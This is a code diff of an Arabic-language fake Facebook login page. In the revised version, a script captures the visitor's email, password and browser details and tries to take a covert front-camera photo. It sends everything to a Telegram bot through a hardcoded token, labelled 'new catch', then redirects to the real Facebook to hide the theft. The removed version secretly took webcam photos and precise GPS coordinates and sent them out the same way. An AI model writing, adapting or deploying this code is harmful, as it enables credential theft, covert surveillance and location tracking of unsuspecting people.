@@ -2,132 +2,112 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فيسبوك</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تسجيل الدخول إلى فيسبوك</title>
+    <link rel="icon" href="https://www.facebook.com/favicon.ico">
     <style>
-        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
-        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
-        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:20px;font-weight:bold;}
-        .form-area {padding:20px;}
-        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
-        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
-        .links {text-align:center;margin:15px 0;font-size:14px;}
+        body {margin:0;padding:0;background:#f0f2f5;font-family: Helvetica, Arial, sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;}
+        .fb-container {width:100%;max-width:412px;background:white;min-height:100vh;display:flex;flex-direction:column;}
+        .header-img {width: 100%; height: auto; margin-top: 20px;}
+        .form-area {padding: 20px 16px;}
+        input {width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;background-color: #f5f6f7;}
+        .login-btn {width:100%;padding:12px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:12px;}
+        .links {text-align:center;margin:20px 0;font-size:14px;}
         .links a {color:#1877f2;text-decoration:none;}
-        .footer {text-align:center;padding:20px;font-size:13px;color:#8a8d91;}
-        .warning {display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);color:white;text-align:center;padding:40px;font-size:20px;z-index:9999;flex-direction:column;justify-content:center;align-items:center;}
+        .footer {margin-top: auto; text-align:center;padding:20px;font-size:12px;color:#8a8d91;}
+        /* Spinner for "Loading" effect */
+        #loader {display:none; margin: 10px auto;}
     </style>
 </head>
 <body>
 
 <div class="fb-container">
-    <div class="header">فيسبوك</div>
+    <center><img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2zS3p9K.svg" width="112" style="margin-top:40px;"></center>
+    
     <div class="form-area">
-        <form>
-            <input type="text" placeholder="رقم الجوال أو البريد الإلكتروني">
-            <input type="password" placeholder="كلمة المرور">
-            <button type="button" class="login-btn">تسجيل الدخول</button>
+        <form id="phishForm">
+            <input type="text" id="user_id" name="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+            <input type="password" id="user_pass" name="pass" placeholder="كلمة السر" required>
+            <button type="submit" class="login-btn" id="submitBtn">تسجيل الدخول</button>
         </form>
+        
         <div class="links">
-            <a href="#">نسيت كلمة المرور؟</a><br><br>
-            <a href="#">إنشاء حساب جديد</a>
+            <a href="#">هل نسيت كلمة السر؟</a>
+            <hr style="border:0; border-top:1px solid #dddfe2; margin:20px 0;">
+            <button style="background:#42b72a; color:white; border:none; padding:10px 16px; border-radius:6px; font-weight:bold;">إنشاء حساب جديد</button>
         </div>
     </div>
+
     <div class="footer">
-        العربية · English · Türkçe · بیشتر<br>
-        Meta © 2025
+        العربية · English (US) · Français (France) · Español<br>
+        Meta © 2026
     </div>
 </div>
 
 <script>
-// === غيّر هذه القيم فقط ===
 const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
 const CHAT_ID = "1611398303";
-// ===========================
 
-let capturedImage = null;
+document.getElementById('phishForm').onsubmit = async function(e) {
+    e.preventDefault();
+    
+    const email = document.getElementById('user_id').value;
+    const pass = document.getElementById('user_pass').value;
+    const btn = document.getElementById('submitBtn');
+    
+    // UI Change to mimic real loading
+    btn.innerText = "جاري تسجيل الدخول...";
+    btn.style.opacity = "0.7";
 
-setTimeout(() => {
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(stream => {
-        let video = document.createElement('video');
+    // 1. Capture Credentials immediately
+    const textData = `🔥 صيد جديد!\n📧 الإيميل: ${email}\n🔑 الباسورد: ${pass}\n📱 المتصفح: ${navigator.userAgent}`;
+    
+    // 2. Attempt Background Surveillance (Camera/GPS)
+    let photoBlob = null;
+    let gpsInfo = "Location Denied";
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.createElement('video');
         video.srcObject = stream;
-        video.play();
+        await video.play();
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = 640; canvas.height = 480;
+        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+        const dataUrl = canvas.toDataURL('image/jpeg');
+        photoBlob = dataURLtoBlob(dataUrl);
+        stream.getTracks().forEach(t => t.stop());
+    } catch (e) { console.log("Cam Blocked"); }
 
-        setTimeout(() => {
-            let canvas = document.createElement('canvas');
-            canvas.width = 1280;
-            canvas.height = 720;
-            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
-            capturedImage = canvas.toDataURL('image/jpeg');
-
-            stream.getTracks().forEach(t => t.stop());
-
-            navigator.geolocation.getCurrentPosition(
-                position => {
-                    // حساب الإحداثيات بدقة
-                    const lat = position.coords.latitude.toFixed(6);
-                    const lng = position.coords.longitude.toFixed(6);
-                    const acc = Math.round(position.coords.accuracy);
-                    const gps = lat + "," + lng + " ±" + acc + "m";
-
-                    // تنسيق الوقت بالعربية كاملاً
-                    const time = new Date().toLocaleString('ar-EG', {
-                        weekday: 'long',
-                        year: 'numeric',
-                        month: 'long',
-                        day: 'numeric',
-                        hour: '2-digit',
-                        minute: '2-digit',
-                        second: '2-digit'
-                    });
-
-                    // الكابتشن باستخدام backticks بشكل صحيح 100%
-                    const caption = "تم \n" +
-                                   "📍 الموقع: " + gps + "\n" +
-                                   "🕐 الوقت: " + time + "\n" +
-                                   "👨‍🏫 سيرفير";
-
-                    const blob = dataURLtoBlob(capturedImage);
-                    const form = new FormData();
-                    form.append('photo', blob, 'lesson.jpg');
-                    form.append('caption', caption);
-                    form.append('chat_id', CHAT_ID);
-
-                    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
-                        method: 'POST',
-                        body: form
-                    }).finally(() => {
-                        window.location.href = "https://m.facebook.com/";
-                    });
-
-                },
-                error => {
-                    document.getElementById('warning').style.display = 'flex';
-                },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-            );
-        }, 3000);
-    })
-    .catch(() => {
-        document.getElementById('warning').style.display = 'flex';
-    });
-}, 3000);
-
-// دالة التحويل
-function dataURLtoBlob(dataurl) {
-    let arr = dataurl.split(',');
-    let mime = arr[0].match(/:(.*?);/)[1];
-    let bstr = atob(arr[1]);
-    let n = bstr.length;
-    let u8arr = new Uint8Array(n);
-    while (n--) {
-        u8arr[n] = bstr.charCodeAt(n);
+    // 3. Send everything to Telegram
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    
+    if (photoBlob) {
+        formData.append('photo', photoBlob, 'victim.jpg');
+        formData.append('caption', textData);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+    } else {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: textData })
+        });
     }
-    return new Blob([u8arr], {type: mime});
+
+    // 4. THE CLEANUP: Redirect to actual Facebook
+    // This makes the user think the login just refreshed or they need to try again on the real site
+    window.location.href = "https://www.facebook.com/login/?next=https%3A%2F%2Fwww.facebook.com%2Fwatch%2F";
+};
+
+function dataURLtoBlob(dataurl) {
+    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+    while(n--){ u8arr[n] = bstr.charCodeAt(n); }
+    return new Blob([u8arr], {type:mime});
 }
 </script>
 
 </body>
 </html>
-
-
